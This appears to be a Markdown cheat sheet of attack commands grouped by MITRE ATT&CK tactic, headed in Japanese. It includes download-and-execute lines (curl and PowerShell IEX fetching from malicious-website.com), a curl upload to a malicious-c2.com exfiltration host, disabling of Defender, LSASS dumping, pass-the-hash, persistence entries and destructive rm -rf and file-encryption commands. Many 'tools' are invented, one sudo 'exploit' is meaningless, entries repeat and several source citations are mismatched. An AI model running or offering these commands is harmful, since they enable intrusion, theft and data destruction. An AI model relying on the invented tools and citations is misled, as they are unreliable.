## 攻撃手法例

:::details Initial Access
```shell
# Send a spear-phishing email with a malicious attachment
sendemail -f attacker@example.com -t target@example.com -u "Important Update" -m "Please see attached" -a malicious_attachment.exe
```
source: https://attack.mitre.org/techniques/T1566/

```shell
# Use an exploit kit to deliver malware via a web browser
curl http://malicious-website.com/ekit -o /tmp/exploit_kit && chmod +x /tmp/exploit_kit && /tmp/exploit_kit
```
source: https://attack.mitre.org/techniques/T1203/
:::

:::details Execution
```shell
# Execute a malicious PowerShell script
powershell -Command "IEX (New-Object Net.WebClient).DownloadString('http://malicious-website.com/malicious.ps1')"
```
source: https://attack.mitre.org/techniques/T1059/001/

```shell
# Execute a payload using a command-line interpreter
cmd.exe /c "payload.exe"
```
source: https://attack.mitre.org/techniques/T1059/
:::

:::details Persistence
```shell
# Install a bootkit to maintain persistence across reboots
bootkit_install -payload /path/to/bootkit
```
source: https://attack.mitre.org/techniques/T1542/003/

```shell
# Create a scheduled task to re-execute payloads
schtasks /create /sc minute /mo 1 /tn "Updater" /tr "cmd.exe /c payload.exe"
```
source: https://attack.mitre.org/techniques/T1053/005/
:::

:::details Privilege Escalation
```shell
# Exploit sudo to gain elevated privileges
echo "exploit code" | sudo -S
```
source: https://github.com/sudo-project/sudo

```shell
# Use a kernel exploit to escalate privileges
wget http://exploit-db.com/exploits/41212.c -O exploit.c && gcc exploit.c -o exploit && ./exploit
```
source: https://attack.mitre.org/techniques/T1068/
:::

:::details Defense Evasion
```shell
# Obfuscate the payload to evade detection
obfuscate_tool -i payload.exe -o obfuscated_payload.exe
```
source: https://attack.mitre.org/techniques/T1027/

```shell
# Disable security tools to avoid detection
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
```
source: https://attack.mitre.org/techniques/T1562/
:::

:::details Credential Access
```shell
# Deploy a keylogger to capture credentials
keylogger -install
```
source: https://attack.mitre.org/techniques/T1056/001/

```shell
# Dump credentials from LSASS memory
procdump -accepteula -ma lsass.exe lsass.dmp
```
source: https://attack.mitre.org/techniques/T1003/001/
:::

:::details Discovery
```shell
# Scan the network to identify other systems
nmap -sP 192.168.1.0/24
```
source: https://attack.mitre.org/techniques/T1046/

```shell
# Gather system information
systeminfo
```
source: https://attack.mitre.org/techniques/T1082/
:::

:::details Lateral Movement
```shell
# Use pass-the-hash to move laterally
pth-winexe -U user%aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99 //target cmd.exe
```
source: https://attack.mitre.org/techniques/T1550/002/

```shell
# Use RDP to move laterally
xfreerdp /u:user /p:password /v:target
```
source: https://attack.mitre.org/techniques/T1021/001/
:::

:::details Collection
```shell
# Collect data from databases or other repositories
dbclient -h target -u user -p password -d database -e "SELECT * FROM sensitive_data"
```
source: https://attack.mitre.org/techniques/T1213/

```shell
# Capture screenshots of the user's desktop
screencapture -x /path/to/screenshot.png
```
source: https://attack.mitre.org/techniques/T1113/
:::

:::details Exfiltration
```shell
# Exfiltrate data over a C2 channel
curl -X POST -d @data.txt http://malicious-c2.com/upload
```
source: https://attack.mitre.org/techniques/T1041/

```shell
# Compress data before exfiltration
tar -czvf data.tar.gz /path/to/data
```
source: https://attack.mitre.org/techniques/T1560/002/
:::

:::details Impact
```shell
# Encrypt files to disrupt operations (ransomware)
openssl enc -aes-256-cbc -salt -in file.txt -out file.enc -k password
```
source: https://attack.mitre.org/techniques/T1486/

```shell
# Delete data to disrupt operations
rm -rf /path/to/data
```
source: https://attack.mitre.org/techniques/T1485/
:::

:::details Command and Control
```shell
# Use web-based C2 communications
c2client -connect http://malicious-c2.com
```
source: https://attack.mitre.org/techniques/T1102/

```shell
# Use domain fronting to disguise C2 traffic
c2client -fronting http://legitimate-site.com -connect http://malicious-c2.com
```
source: https://attack.mitre.org/techniques/T1071/003/
:::

:::details Recon
```shell
# Start botnet-server 
botnet-server --start
```
source: https://github.com/jgamblin/Mirai-Source-Code
:::

:::details Exfiltration
```shell
# Exfiltrate data using rsync over SSH
rsync -avz -e ssh /path/to/data user@malicious-server:/path/to/destination
```
source: https://linux.die.net/man/1/rsync
:::

:::details Collection
```shell
# Archive files for easier exfiltration
tar -czvf archive.tar.gz /path/to/files
```
source: https://attack.mitre.org/techniques/T1560/
:::

:::details Lateral Movement
```shell
# Use SMB to move laterally across the network
smbclient //target/share -U user -p password
```
source: https://attack.mitre.org/techniques/T1021/002/
:::

:::details Discovery
```shell
# Perform an ARP scan to identify devices on the network
arp-scan -l
```
source: https://nmap.org/book/arp-scanning.html
:::

:::details Credential Access
```shell
# Crack password hashes to gain access
hashcat -m 1000 -a 0 hash.txt /path/to/wordlist
```
source: https://hashcat.net/hashcat/
:::

:::details Defense Evasion
```shell
# Use a Tor proxy to anonymize communications
torify curl http://malicious-site.com
```
source: https://www.torproject.org/
:::

:::details Privilege Escalation
```shell
# Exploit a vulnerability in sudo for root access
echo "exploit code" | sudo -S
```
source: https://github.com/sudo-project/sudo
:::

:::details Persistence
```shell
# Create a startup item to ensure persistence
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\path\to\payload.exe" /f
```
source: https://attack.mitre.org/techniques/T1037/
:::

:::details Execution
```shell
# Execute a Java-based payload
java -jar payload.jar
```
source: https://attack.mitre.org/techniques/T1059/007/
:::

:::details Initial Access
```shell
# Compromise a website to deliver malware
waterhole_attack -target http://compromised-website.com
```
source: https://attack.mitre.org/techniques/T1189/
:::
